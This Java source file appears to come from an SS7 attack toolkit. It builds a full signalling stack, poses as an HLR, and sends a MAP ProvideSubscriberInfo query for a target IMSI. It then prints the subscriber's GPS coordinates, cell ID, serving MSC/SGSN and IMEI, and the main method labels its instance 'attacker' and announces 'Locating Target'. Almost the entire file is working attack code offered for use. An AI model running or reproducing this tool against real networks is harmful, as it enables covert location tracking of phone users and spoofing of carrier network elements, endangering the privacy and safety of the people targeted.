/**
 * Created by gh0 on 10/27/16.
 */



import org.apache.log4j.Logger;
import org.mobicents.protocols.api.IpChannelType;
import org.mobicents.protocols.sctp.ManagementImpl;
import org.mobicents.protocols.ss7.indicator.NatureOfAddress;
import org.mobicents.protocols.ss7.indicator.RoutingIndicator;
import org.mobicents.protocols.ss7.m3ua.ExchangeType;
import org.mobicents.protocols.ss7.m3ua.Functionality;
import org.mobicents.protocols.ss7.m3ua.IPSPType;
import org.mobicents.protocols.ss7.m3ua.impl.AspImpl;
import org.mobicents.protocols.ss7.m3ua.impl.M3UAManagementImpl;
import org.mobicents.protocols.ss7.m3ua.parameter.RoutingContext;
import org.mobicents.protocols.ss7.m3ua.parameter.TrafficModeType;
import org.mobicents.protocols.ss7.map.MAPStackImpl;
import org.mobicents.protocols.ss7.map.api.MAPApplicationContext;
import org.mobicents.protocols.ss7.map.api.MAPApplicationContextName;
import org.mobicents.protocols.ss7.map.api.MAPApplicationContextVersion;
import org.mobicents.protocols.ss7.map.api.MAPDialog;
import org.mobicents.protocols.ss7.map.api.primitives.*;
import org.mobicents.protocols.ss7.map.api.service.callhandling.*;
import org.mobicents.protocols.ss7.map.api.service.mobility.*;
import org.mobicents.protocols.ss7.map.api.MAPException;
import org.mobicents.protocols.ss7.map.api.MAPMessage;
import org.mobicents.protocols.ss7.map.api.MAPProvider;
import org.mobicents.protocols.ss7.map.api.dialog.MAPAbortProviderReason;
import org.mobicents.protocols.ss7.map.api.dialog.MAPAbortSource;
import org.mobicents.protocols.ss7.map.api.dialog.MAPNoticeProblemDiagnostic;
//import org.mobicents.protocols.ss7.map.api.dialog.MAPProviderError;
import org.mobicents.protocols.ss7.map.api.dialog.MAPRefuseReason;
import org.mobicents.protocols.ss7.map.api.dialog.MAPUserAbortChoice;
import org.mobicents.protocols.ss7.map.api.errors.MAPErrorMessage;
import org.mobicents.protocols.ss7.map.api.service.mobility.authentication.AuthenticationFailureReportRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.authentication.AuthenticationFailureReportResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.authentication.SendAuthenticationInfoRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.authentication.SendAuthenticationInfoResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.faultRecovery.ForwardCheckSSIndicationRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.faultRecovery.ResetRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.faultRecovery.RestoreDataRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.faultRecovery.RestoreDataResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.imei.CheckImeiRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.imei.CheckImeiResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.locationManagement.*;
import org.mobicents.protocols.ss7.map.api.service.mobility.oam.ActivateTraceModeRequest_Mobility;
import org.mobicents.protocols.ss7.map.api.service.mobility.oam.ActivateTraceModeResponse_Mobility;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberInformation.*;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberManagement.*;
import org.mobicents.protocols.ss7.sccp.OriginationType;
import org.mobicents.protocols.ss7.sccp.RuleType;
import org.mobicents.protocols.ss7.sccp.SccpProvider;
import org.mobicents.protocols.ss7.sccp.SccpResource;
import org.mobicents.protocols.ss7.sccp.impl.SccpStackImpl;
import org.mobicents.protocols.ss7.sccp.parameter.GlobalTitle0100;
import org.mobicents.protocols.ss7.sccp.parameter.SccpAddress;
import org.mobicents.protocols.ss7.tcap.TCAPStackImpl;
import org.mobicents.protocols.ss7.tcap.api.TCAPStack;
import org.mobicents.protocols.ss7.tcap.asn.ApplicationContextName;
import org.mobicents.protocols.ss7.tcap.asn.comp.Problem;

import java.nio.ByteBuffer;
import java.util.Arrays;


public class ProvideSubscriberInformationReq extends PSILowLevel implements MAPServiceMobilityListener {

    private static Logger logger = Logger.getLogger(ProvideSubscriberInformationReq.class);

    // SCTP
    private ManagementImpl sctpManagement;

    // M3UA
    private M3UAManagementImpl clientM3UAMgmt;

    // SCCP
    private SccpStackImpl sccpStack;
    private SccpProvider sccpProvider;
    private SccpResource sccpResource;

    // TCAP
    private TCAPStack tcapStack;

    // MAP
    private MAPStackImpl mapStack;
    private MAPProvider mapProvider;


    public ProvideSubscriberInformationReq() {
        // TODO Auto-generated constructor stub
    }

    protected void initializeStack(IpChannelType ipChannelType) throws Exception {

        this.initSCTP(ipChannelType);

        // Initialize M3UA first
        this.initM3UA();

        // Initialize SCCP
        this.initSCCP();

        // Initialize TCAP
        this.initTCAP();

        // Initialize MAP
        this.initMAP();

        // FInally start ASP
        // Set 5: Finally start ASP
        this.clientM3UAMgmt.startAsp("ASP1");
    }

    private void initSCTP(IpChannelType ipChannelType) throws Exception {
        System.out.println("\033[34m[*]\033[0mInitializing SCTP Stack ....");
        try {
            this.sctpManagement = new ManagementImpl("Client");
            this.sctpManagement.setSingleThread(true);
            this.sctpManagement.start();
            this.sctpManagement.setConnectDelay(10000);
            this.sctpManagement.removeAllResourses();

            // 1. Create SCTP Association
            sctpManagement.addAssociation(CLIENT_IP, CLIENT_PORT, SERVER_IP, SERVER_PORT, CLIENT_ASSOCIATION_NAME,
                    ipChannelType, null);

            System.out.println("\033[32m[+]\033[0mInitialized SCTP Stack ....");
        }catch(Exception e){
            System.out.println("\033[31m[-]\033[0mError initializing SCTP Stack: "+e);
        }
    }

    private void initM3UA() throws Exception {
        System.out.println("\033[34m[*]\033[0mInitializing M3UA Stack ....");
        this.clientM3UAMgmt = new M3UAManagementImpl("Client", null);
        this.clientM3UAMgmt.setTransportManagement(this.sctpManagement);
        this.clientM3UAMgmt.start();
        this.clientM3UAMgmt.removeAllResourses();

        // m3ua as create rc <rc> <ras-name>
        RoutingContext rc = factory.createRoutingContext(new long[]{100l});
        TrafficModeType trafficModeType = factory.createTrafficModeType(TrafficModeType.Loadshare);

        try {
            this.clientM3UAMgmt.createAs("AS1", Functionality.IPSP, ExchangeType.SE, IPSPType.CLIENT, rc,
                    trafficModeType, 1, null);

            // Step 2 : Create ASP
            this.clientM3UAMgmt.createAspFactory("ASP1", CLIENT_ASSOCIATION_NAME);

            // Step3 : Assign ASP to AS
            AspImpl asp = this.clientM3UAMgmt.assignAspToAs("AS1", "ASP1");

            // Step 4: Add Route.
            clientM3UAMgmt.addRoute(SERVER_SPC, CLIENT_SPC, SERVICE_INDICATOR, "AS1");
            System.out.println("\033[32m[+]\033[0mInitialized M3UA Stack ....");
        } catch(Exception e) {
            System.out.println("\033[31m[-]\033[0mError initializing M3UA Stack: "+e);

        }

    }


    private void initSCCP() throws Exception {
        System.out.println("\033[34m[*]\033[0mInitializing SCCP Stack ....");
        try {
            this.sccpStack = new SccpStackImpl("MapLoadClientSccpStack");
            this.sccpStack.setMtp3UserPart(1, this.clientM3UAMgmt);

            this.sccpStack.start();
            this.sccpStack.removeAllResourses();

            this.sccpStack.getSccpResource().addRemoteSpc(1, SERVER_SPC, 0, 0);
            this.sccpStack.getSccpResource().addRemoteSsn(1, SERVER_SPC, SSN_Server, 0, false);

            this.sccpStack.getRouter().addMtp3ServiceAccessPoint(1, 1, CLIENT_SPC, NETWORK_INDICATOR, 0);

            this.sccpStack.getRouter().addMtp3Destination(1, 1, SERVER_SPC, SERVER_SPC, 0, 255, 255);


            this.sccpProvider = this.sccpStack.getSccpProvider();

            // SCCP routing table
            GlobalTitle0100 remoteVLR = this.sccpProvider.getParameterFactory().createGlobalTitle
                    (VLR, 0, org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
                            NatureOfAddress.INTERNATIONAL);
            GlobalTitle0100 localHLRGT = this.sccpProvider.getParameterFactory().createGlobalTitle
                    (HLR, 0, org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
                            NatureOfAddress.INTERNATIONAL);


            this.sccpStack.getRouter().addRoutingAddress
                    (1, this.sccpProvider.getParameterFactory().createSccpAddress
                            (RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, remoteVLR, SERVER_SPC, SSN_Server));

            this.sccpStack.getRouter().addRoutingAddress
                    (2, this.sccpProvider.getParameterFactory().createSccpAddress(
                            RoutingIndicator.ROUTING_BASED_ON_DPC_AND_SSN, localHLRGT, CLIENT_SPC, SSN_Client));


            SccpAddress patternRemote = this.sccpProvider.getParameterFactory().createSccpAddress(
                    RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, remoteVLR, SERVER_SPC, SSN_Server);
            SccpAddress patternLocal = this.sccpProvider.getParameterFactory().createSccpAddress
                    (RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, localHLRGT, CLIENT_SPC, SSN_Client);

            String maskRemote = "K";
            String maskLocal = "R";

            //translate local GT to its POC+SSN (local rule)GTT
            this.sccpStack.getRouter().addRule
                    (1, RuleType.SOLITARY, null, OriginationType.LOCAL, patternRemote, maskRemote, 1, -1, null, 0);
            this.sccpStack.getRouter().addRule
                    (2, RuleType.SOLITARY, null, OriginationType.REMOTE, patternLocal, maskLocal, 2, -1, null, 0);
            System.out.println("\033[32m[+]\033[0mInitialized SCCP Stack ....");

        }catch (Exception e){
            System.out.println("\033[31m[-]\033[0mError initializing SCCP Stack: "+e);
        }

    }

    private void initTCAP() throws Exception {
        System.out.println("\033[34m[*]\033[0mInitializing TCAP Stack ....");
        try {
            this.tcapStack = new TCAPStackImpl("PSI", this.sccpStack.getSccpProvider(), SSN_Client);
            this.tcapStack.start();
            this.tcapStack.setDialogIdleTimeout(60000);
            this.tcapStack.setInvokeTimeout(30000);
            this.tcapStack.setMaxDialogs(2000);
            System.out.println("\033[32m[+]\033[0mInitialized TCAP Stack ....");
        }catch(Exception e){
            System.out.println("\033[31m[-]\033[0mError initializing TCAP Stack: "+e);
        }
    }

    private void initMAP() throws Exception {
        System.out.println("\033[34m[*]\033[0mInitializing MAAP Stack ....");
        try {

            this.mapStack = new MAPStackImpl("MAP-HLR", this.tcapStack.getProvider());
            this.mapProvider = this.mapStack.getMAPProvider();

            this.mapProvider.addMAPDialogListener(this);
            this.mapProvider.getMAPServiceMobility().addMAPServiceListener(this);

            this.mapProvider.getMAPServiceMobility().acivate();


            this.mapStack.start();
            System.out.println("\033[32m[+]\033[0mInitialized MAP Stack ....");
            Thread.sleep(2000);
        }catch(Exception e){
            System.out.println("\033[31m[-]\033[0mError initializing MAP Stack: "+e);
        }

    }

    private void initiatePSI() throws MAPException {

        //Create of the target IMSI
        IMSI imsi = this.mapProvider.getMAPParameterFactory
                ().createIMSI(IMSI);


        //Creating Requested information to be gathered from target VLR
        RequestedInfo requestedInfo = this.mapProvider.getMAPParameterFactory().createRequestedInfo(true,true,null,true,
                DomainType.csDomain,true,false,false);


        System.out.println("\033[34m[*]\033[0mLocating Target: " + imsi.getData());

        //Creating the GT for the target VLR
        GlobalTitle0100 gtVLR = this.sccpProvider.getParameterFactory().createGlobalTitle
                (VLR,0,org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY,null,
                        NatureOfAddress.INTERNATIONAL);

        //Creating the GT for Querying HLR
        GlobalTitle0100 gtHLR = this.sccpProvider.getParameterFactory().createGlobalTitle
                (HLR,0,org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY,null,
                        NatureOfAddress.INTERNATIONAL);


        SccpAddress callingParty = this.sccpStack.getSccpProvider().getParameterFactory
                ().createSccpAddress(RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, gtHLR, CLIENT_SPC, SSN_Client);

        SccpAddress calledParty = this.sccpStack.getSccpProvider().getParameterFactory
                ().createSccpAddress(RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE,
                gtVLR, SERVER_SPC, SSN_Server);

        // First create Dialog
        MAPDialogMobility mapDialog = this.mapProvider.getMAPServiceMobility().createNewDialog
                (MAPApplicationContext.getInstance(MAPApplicationContextName.subscriberInfoEnquiryContext,
                        MAPApplicationContextVersion.version3),
                        callingParty, null, calledParty, null);


        mapDialog.addProvideSubscriberInfoRequest(imsi,null,requestedInfo,null,null);

        // This will initiate the TC-BEGIN with INVOKE component
        try {
            mapDialog.send();
            System.out.println("\033[34m[*]\033[0mLocation Retrieval for Target " + imsi.getData() + " is processing..\n");
        }
        catch (MAPException e){
            System.out.println("\033[31m[-]\033[0mMAP Error: "+ e.getMessage());
        }
    }

    public void onDialogAccept(MAPDialog mapDialog, MAPExtensionContainer extensionContainer) {
        if (logger.isDebugEnabled()) {
            logger.debug(String.format("onDialogAccept for DialogId=%d MAPExtensionContainer=%s",
                    mapDialog.getLocalDialogId(), extensionContainer));
        }
    }


    public void onDialogClose(MAPDialog mapDialog) {
        if (logger.isDebugEnabled()) {
            logger.debug(String.format("DialogClose for Dialog=%d", mapDialog.getLocalDialogId()));
        }

    }

    public void onDialogDelimiter(MAPDialog mapDialog) {
        if (logger.isDebugEnabled()) {
            logger.debug(String.format("onDialogDelimiter for DialogId=%d", mapDialog.getLocalDialogId()));
        }
    }

    public void onDialogNotice(MAPDialog mapDialog, MAPNoticeProblemDiagnostic noticeProblemDiagnostic) {
        System.err.printf("[-]Error: onDialogNotice for DialogId=%d MAPNoticeProblemDiagnostic=%s ",
                mapDialog.getLocalDialogId(), noticeProblemDiagnostic);
    }


    public void onDialogProviderAbort(MAPDialog mapDialog, MAPAbortProviderReason abortProviderReason,
                                      MAPAbortSource abortSource, MAPExtensionContainer extensionContainer) {
        System.err.printf("[-]Error: onDialogProviderAbort for DialogId=%d MAPAbortProviderReason=%s MAPAbortSource=%s MAPExtensionContainer=%s",
                mapDialog.getLocalDialogId(), abortProviderReason, abortSource, extensionContainer);
    }


    public void onDialogReject(MAPDialog mapDialog, MAPRefuseReason refuseReason,
                               ApplicationContextName alternativeApplicationContext, MAPExtensionContainer extensionContainer) {
        System.err.printf("[-]Error: onDialogReject for DialogId=%d MAPRefuseReason=%s MAPProviderError=%s ApplicationContextName=%s MAPExtensionContainer=%s",
                mapDialog.getLocalDialogId(), refuseReason, alternativeApplicationContext, extensionContainer);
    }


    public void onDialogRelease(MAPDialog mapDialog) {
        if (logger.isDebugEnabled()) {
            logger.debug(String.format("[-]Error: onDialogResease for DialogId=%d", mapDialog.getLocalDialogId()));
        }
    }


    public void onDialogRequest(MAPDialog mapDialog, AddressString destReference, AddressString origReference,
                                MAPExtensionContainer extensionContainer) {
        if (logger.isDebugEnabled()) {
            logger.debug(String
                    .format("[-]Error: onDialogRequest for DialogId=%d DestinationReference=%s OriginReference=%s MAPExtensionContainer=%s",
                            mapDialog.getLocalDialogId(), destReference, origReference, extensionContainer));
        }
    }

    @Override
    public void onDialogRequestEricsson(MAPDialog mapDialog, AddressString addressString, AddressString addressString1, AddressString addressString2, AddressString addressString3) {

    }


    public void onDialogRequestEricsson(MAPDialog mapDialog, AddressString destReference, AddressString origReference,
                                        IMSI arg3, AddressString arg4) {
        if (logger.isDebugEnabled()) {
            logger.debug(String.format("[-]Error: onDialogRequest for DialogId=%d DestinationReference=%s OriginReference=%s ",
                    mapDialog.getLocalDialogId(), destReference, origReference));
        }
    }


    public void onDialogTimeout(MAPDialog mapDialog) {
        System.err.printf("[-]Error: onDialogTimeout for DialogId=%d", mapDialog.getLocalDialogId());
    }


    public void onDialogUserAbort(MAPDialog mapDialog, MAPUserAbortChoice userReason,
                                  MAPExtensionContainer extensionContainer) {
        System.err.printf("[-]Error: onDialogUserAbort for DialogId=%d MAPUserAbortChoice=%s MAPExtensionContainer=%s",
                mapDialog.getLocalDialogId(), userReason, extensionContainer);
    }


    public void onErrorComponent(MAPDialog mapDialog, Long invokeId, MAPErrorMessage mapErrorMessage) {
        System.err.printf("[-]Error: onErrorComponent for Dialog=%d and invokeId=%d MAPErrorMessage=%s",
                mapDialog.getLocalDialogId(), invokeId, mapErrorMessage);
    }

    @Override
    public void onRejectComponent(MAPDialog mapDialog, Long aLong, Problem problem, boolean b) {

    }


    public void onInvokeTimeout(MAPDialog mapDialog, Long invokeId) {
        System.err.printf("[-]Error: onInvokeTimeout for Dialog=%d and invokeId=%d", mapDialog.getLocalDialogId(), invokeId);
    }




    public void onMAPMessage(MAPMessage mapMessage) {
        // TODO Auto-generated method stub
    }


    public void onProviderErrorComponent(MAPDialog mapDialog, Long invokeId) {
        System.err.printf("onProviderErrorComponent for Dialog=%d and invokeId=%d MAPProviderError=%s",
                mapDialog.getLocalDialogId(), invokeId);
    }


    public void onRejectComponent(MAPDialog mapDialog, Long invokeId, Problem problem) {
        System.err.printf("onRejectComponent for Dialog=%d and invokeId=%d Problem=%s", mapDialog.getLocalDialogId(), invokeId, problem);
    }


    public static void main(String args[]) {
        System.out.println("*********************************************");
        System.out.println("***        Locating Target                ***");
        System.out.println("*********************************************");
        IpChannelType ipChannelType = IpChannelType.SCTP;


        final ProvideSubscriberInformationReq attacker = new ProvideSubscriberInformationReq();

        try {
            attacker.initializeStack(ipChannelType);

            // Lets pause for 20 seconds so stacks are initialized properly
            Thread.sleep(20000);
            attacker.initiatePSI();

        } catch (Exception e) {
            System.out.println("\033[31m[-]\033[0mError: " + e.getMessage());
        }
    }

    @Override
    public void onProvideSubscriberInfoRequest(ProvideSubscriberInfoRequest provideSubscriberInfoRequest) {

    }

    @Override
    public void onProvideSubscriberInfoResponse(ProvideSubscriberInfoResponse provideSubscriberInfoResponse) {
        try {

            String imei  = provideSubscriberInfoResponse.getSubscriberInfo().getIMEI().getIMEI();

            double Lat;
            double Long;

            double Lat_cs = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation().getGeographicalInformation().getLatitude();
            double Long_cs = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation().getGeographicalInformation().getLongitude();
            double accuracy_cs = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation().getGeographicalInformation().getUncertainty();

            double Lat_ps = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformationGPRS().getGeographicalInformation().getLatitude();
            double Long_ps = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformationGPRS().getGeographicalInformation().getLongitude();
            double accuracy_ps = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformationGPRS().getGeographicalInformation().getUncertainty();

            if (accuracy_ps < accuracy_cs){
                Lat = Lat_ps;
                Long = Long_ps;
            }else{
                Lat = Lat_cs;
                Long = Long_cs;
            }

            String Vmsc = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation().getVlrNumber().getAddress();

            int mcc = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation().getCellGlobalIdOrServiceAreaIdOrLAI().getCellGlobalIdOrServiceAreaIdFixedLength().getMCC();
            int mnc = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation().getCellGlobalIdOrServiceAreaIdOrLAI().getCellGlobalIdOrServiceAreaIdFixedLength().getMNC();
            int LAC = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation().getCellGlobalIdOrServiceAreaIdOrLAI().getCellGlobalIdOrServiceAreaIdFixedLength().getLac();
            int CI = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation().getCellGlobalIdOrServiceAreaIdOrLAI().getCellGlobalIdOrServiceAreaIdFixedLength().getCellIdOrServiceAreaCode();

            /*byte[] RAC = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformationGPRS().getRouteingAreaIdentity().getData();
            int rac = ByteBuffer.wrap(new byte[]{RAC[0]}).getInt();*/

            String sgsn = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformationGPRS().getSGSNNumber().getAddress();

            System.out.println("******* Target's Info and Location *******");

            if (Vmsc.isEmpty()) {
                System.out.println("\033[32m[-]\033[0mNo Info returned for the parameter MSC");
            }else{
                System.out.println("\033[32m[+]\033[0mTarget is served by the MSC:\033[31m "+ Vmsc);
            }
            if(sgsn.isEmpty()) {
                System.out.println("\033[32m[-]\033[0mNo Info returned for SGSN address");
            }else{
                System.out.println("\033[32m[+]\033[0mTarget is served by the MSC:\033[31m "+ sgsn);
            }
            if(Lat==0 && Long ==0){
                System.out.println("\033[32m[-]\033[0mNo Info returned for the parameters LAT and Long");
            }else{
                System.out.println("\033[32m[+]\033[0mGPS Location Information:\033[31mLAT "+Lat +"\t"+"Long "+Long);
            }
            if(provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation().getCellGlobalIdOrServiceAreaIdOrLAI().toString().isEmpty()){
                System.out.println("\033[31m[-]\033[0mNo Info returned for the Cell Global ID parameter");
            }else{
                System.out.println("\033[32m[+]\033[0mCellID:\033[31mMCC(" +mcc+")" +"MNC("+mnc+")" +"LAC(" +LAC+")" +"CI("+CI+")"+"\tCheck it out on opencellid.org");
            }
            //System.out.println("\033[32m[+]\033[0mRouting Area Code:\033[31m " + rac);

            if(imei.isEmpty()){
                System.out.println("\033[31m[-]\033[0mNo Info returned for the IMEI parameter");
            }else{
                System.out.println("\033[32m[+]\033[0mIMEI:\033[31m " + imei);
            }


            System.out.println("\033[34m[**]\033[0mSubscriber's Information Gathering and Network Probing is completed\033[34m[**]\033[0m");

        }catch (Exception e){
            System.out.println("\033[31m[-]\033[0mError: " + e.getMessage());
        }

        System.exit(0);
    }

    @Override
    public void onUpdateLocationRequest(UpdateLocationRequest updateLocationRequest) {

    }

    @Override
    public void onUpdateLocationResponse(UpdateLocationResponse updateLocationResponse) {

    }

    @Override
    public void onCancelLocationRequest(CancelLocationRequest cancelLocationRequest) {

    }

    @Override
    public void onCancelLocationResponse(CancelLocationResponse cancelLocationResponse) {

    }

    @Override
    public void onSendIdentificationRequest(SendIdentificationRequest sendIdentificationRequest) {

    }

    @Override
    public void onSendIdentificationResponse(SendIdentificationResponse sendIdentificationResponse) {

    }

    @Override
    public void onUpdateGprsLocationRequest(UpdateGprsLocationRequest updateGprsLocationRequest) {

    }

    @Override
    public void onUpdateGprsLocationResponse(UpdateGprsLocationResponse updateGprsLocationResponse) {

    }

    @Override
    public void onPurgeMSRequest(PurgeMSRequest purgeMSRequest) {

    }

    @Override
    public void onPurgeMSResponse(PurgeMSResponse purgeMSResponse) {

    }

    @Override
    public void onSendAuthenticationInfoRequest(SendAuthenticationInfoRequest sendAuthenticationInfoRequest) {

    }

    @Override
    public void onSendAuthenticationInfoResponse(SendAuthenticationInfoResponse sendAuthenticationInfoResponse) {

    }

    @Override
    public void onAuthenticationFailureReportRequest(AuthenticationFailureReportRequest authenticationFailureReportRequest) {

    }

    @Override
    public void onAuthenticationFailureReportResponse(AuthenticationFailureReportResponse authenticationFailureReportResponse) {

    }

    @Override
    public void onResetRequest(ResetRequest resetRequest) {

    }

    @Override
    public void onForwardCheckSSIndicationRequest(ForwardCheckSSIndicationRequest forwardCheckSSIndicationRequest) {

    }

    @Override
    public void onRestoreDataRequest(RestoreDataRequest restoreDataRequest) {

    }

    @Override
    public void onRestoreDataResponse(RestoreDataResponse restoreDataResponse) {

    }

    @Override
    public void onAnyTimeInterrogationRequest(AnyTimeInterrogationRequest anyTimeInterrogationRequest) {

    }

    @Override
    public void onAnyTimeInterrogationResponse(AnyTimeInterrogationResponse anyTimeInterrogationResponse) {

    }



    @Override
    public void onInsertSubscriberDataRequest(InsertSubscriberDataRequest insertSubscriberDataRequest) {

    }

    @Override
    public void onInsertSubscriberDataResponse(InsertSubscriberDataResponse insertSubscriberDataResponse) {

    }

    @Override
    public void onDeleteSubscriberDataRequest(DeleteSubscriberDataRequest deleteSubscriberDataRequest) {

    }

    @Override
    public void onDeleteSubscriberDataResponse(DeleteSubscriberDataResponse deleteSubscriberDataResponse) {

    }

    @Override
    public void onCheckImeiRequest(CheckImeiRequest checkImeiRequest) {

    }

    @Override
    public void onCheckImeiResponse(CheckImeiResponse checkImeiResponse) {

    }

    @Override
    public void onActivateTraceModeRequest_Mobility(ActivateTraceModeRequest_Mobility activateTraceModeRequest_mobility) {

    }

    @Override
    public void onActivateTraceModeResponse_Mobility(ActivateTraceModeResponse_Mobility activateTraceModeResponse_mobility) {

    }


    @Override
    public void onSendRoutingInformationRequest(SendRoutingInformationRequest sendRoutingInformationRequest) {

    }

    @Override
    public void onSendRoutingInformationResponse(SendRoutingInformationResponse sendRoutingInformationResponse) {

    }

    @Override
    public void onProvideRoamingNumberRequest(ProvideRoamingNumberRequest provideRoamingNumberRequest) {

    }

    @Override
    public void onProvideRoamingNumberResponse(ProvideRoamingNumberResponse provideRoamingNumberResponse) {

    }

    @Override
    public void onIstCommandRequest(IstCommandRequest istCommandRequest) {

    }

    @Override
    public void onIstCommandResponse(IstCommandResponse istCommandResponse) {

    }
}
